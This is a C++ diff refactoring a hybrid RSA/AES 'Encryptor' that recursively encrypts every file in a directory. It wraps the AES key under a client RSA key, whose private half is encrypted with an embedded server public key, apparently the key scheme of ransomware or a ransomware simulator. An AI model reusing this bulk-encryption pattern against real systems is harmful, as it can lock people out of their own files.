@@ -7,7 +7,7 @@ namespace butterfly
 namespace hybrid
 {
 
-Encryptor::Encryptor(int keySize) : _keySize(keySize), _aesKeyInit(false),
+Encryptor::Encryptor(int keySize) : _keySize(keySize),
                                     _rsaEncryptorAESKey(new rsa::RSAEncryptor(_keySize)),
                                     _rsaEncryptorCPrivateRSA(new rsa::RSAEncryptor(rsa::SPUBLIC_PEM)),
                                     _aesEncryptor(new aes::AESEncryptor())
@@ -17,58 +17,13 @@ Encryptor::Encryptor(int keySize) : _keySize(keySize), _aesKeyInit(false),
     #endif
 }
 
-void Encryptor::validateAESKeyLength()
-{
-    std::string aeskey, aesiv, aeskeypair;
-    do
-    {
-
-        if ( _aesKeyInit )
-        {
-            sleep(1);
-            _aesEncryptor->generateAESKeyWithSalt();
-        }
-
-        aeskey = _aesEncryptor->getAESKey();
-        aesiv = _aesEncryptor->getAESIv();
-        aeskeypair = _aesEncryptor->getAESKeyPair();
-        #ifdef LOGGING
-        LOG_TRACE("Generated AESKey: " << aeskey << " with Length: " << aeskey.length() << " and AESIV: " <<  aesiv << " with Length: " << aesiv.length() << " and AESKeyPairLength: " << aeskeypair.length());
-        #endif
-        _aesKeyInit = true;
-
-    }
-    while ( (aeskey.length() < 32) or (aesiv.length() < 16));
-
-}
-
-void Encryptor::saveUnencryptedAESKeyPair(const std::string &aesKeyPair)
-{
-    // 32 Bytes AESKey + 16 Bytes IV
-    if ( !butterfly::writeBinFile(butterfly::params::UNENC_AESKEY_FILENAME, aesKeyPair.c_str(), static_cast<long>(aesKeyPair.length())) )
-    {
-        #ifdef LOGGING
-        LOG_ERROR("Could not save the unencrypted AESKeyPair File to Filesystem!");
-        #else
-        std::cerr << "Could not save the unencrypted AESKeyPair File to Filesystem!" << std::endl;
-        #endif
-    }
-
-}
-
-void Encryptor::checkIfEncryptionFilesExists()
-{
-    if ( butterfly::existsFile(butterfly::params::ENC_CPRIVATERSA_FILENAME) && butterfly::existsFile(butterfly::params::ENC_AESKEY_FILENAME) && butterfly::existsFile(butterfly::params::RSA_EKIV_FILENAME) )
-    {
-        std::cerr << "Aborting encryption because encryption files (" << butterfly::params::ENC_CPRIVATERSA_FILENAME << ", " << butterfly::params::ENC_AESKEY_FILENAME << ", " << butterfly::params::RSA_EKIV_FILENAME <<") already exists!" << std::endl;
-        exit(1);
-    }
-}
-
 void Encryptor::invokeDir(const std::string &dirPath, bool protection)
 {
     // Ensure that no encryption files already exists!
-    checkIfEncryptionFilesExists();
+    if ( CryptoSecurity::areEncryptionFilesAvailable() )
+    {
+        throw EncryptorException("Aborting encryption because encryption files (" + butterfly::params::ENC_CPRIVATERSA_FILENAME + ", " + butterfly::params::ENC_AESKEY_FILENAME + ", " + butterfly::params::RSA_EKIV_FILENAME +") already exists!");
+    }
 
     // Check if dirPath exists
     if ( !DirectoryIterator::exists(dirPath) )
@@ -91,10 +46,17 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
     // Encrypt the CPrivateRSA.pem String to CPrivateRSA.bin
     encryptCPrivateRSA();
 
-    if ( !aes::AESEncryptor::initDone() )
+
+    if ( !aes::AESEncryptor::isInitialized() )
     {
-        // Generate and validate the AES Key and IV
-        validateAESKeyLength();
+
+        bool rc = _aesEncryptor->generateAESKeyWithSalt();
+
+        if ( !rc && (!_aesEncryptor->isInitialized()) )
+        {
+            throw AESEncryptionException("Error on initializing the AESKey with SALT!");
+        }
+
     }
 
     // Get the AESKeyPair(AESKey + AESIV)
@@ -106,7 +68,7 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
     // If --protected is enabled
     if (protection)
     {
-        saveUnencryptedAESKeyPair(aeskeypair);
+        CryptoSecurity::saveUnencryptedAESKeyPair(aeskeypair);
     }
 
     // Iterate over all file paths
@@ -122,7 +84,7 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
                 #ifdef LOGGING
                 LOG_TRACE("Spawn a new encryption thread for file: " << file.string());
                 #endif
-                spawnThread(file.string());
+                CryptoThread::create(file.string());
             } else
             {
                 encryptFileWithAES(file.string());
@@ -133,7 +95,7 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
     }
 
     // Join all threads which were spawned for large file encryption
-    joinThreads();
+    CryptoThread::joinThreads();
 
     // Save the AESKEY Pair in the final AESKey.bin file
     encryptFinalAESKeyWithRSA(aeskeypair);
@@ -182,6 +144,21 @@ void Encryptor::encryptFileWithAES(const std::string &filepath)
 
 }
 
+void Encryptor::handleLargeFilesWithAES(const std::string &filepath)
+{
+    // Create new instance for each large file
+    std::unique_ptr<aes::AESEncryptor> aesEncInstance = std::unique_ptr<aes::AESEncryptor>(new aes::AESEncryptor());
+    try
+    {
+        // Encrypt the file with AES
+        aesEncInstance->encryptLargeFile(filepath);
+
+    } catch (AESEncryptionException &e)
+    {
+        std::cerr << e.what() << std::endl;
+    }
+}
+
 void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyPair)
 {
 
@@ -201,42 +178,9 @@ void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyPair)
     {
         std::cerr << e.what() << std::endl;
         // If error occurred here, save AESKeyPair unencrypted to ensure that files can be decrypted manually
-        saveUnencryptedAESKeyPair(aesKeyPair);
+        CryptoSecurity::saveUnencryptedAESKeyPair(aesKeyPair);
     }
 
-}
-
-void Encryptor::spawnThread(const std::string &filepath)
-{
-
-    // Create dedicated thread for this encryption file
-    std::thread t([&filepath]()
-    {
-        // Create new instance for each large file
-        std::unique_ptr<aes::AESEncryptor> aesEncInstance = std::unique_ptr<aes::AESEncryptor>(new aes::AESEncryptor());
-        try
-        {
-            // Encrypt the file with AES
-            aesEncInstance->encryptLargeFile(filepath);
-
-        } catch (AESEncryptionException &e)
-        {
-            std::cerr << e.what() << std::endl;
-        }
-
-    });
-
-    // Save thread in thread vector
-    _threads.push_back(std::move(t));
-}
-
-void Encryptor::joinThreads()
-{
-    for (auto &t: _threads)
-    {
-        if ( t.joinable() )
-            t.join();
-    }
 }
 
 } // namespace hybrid
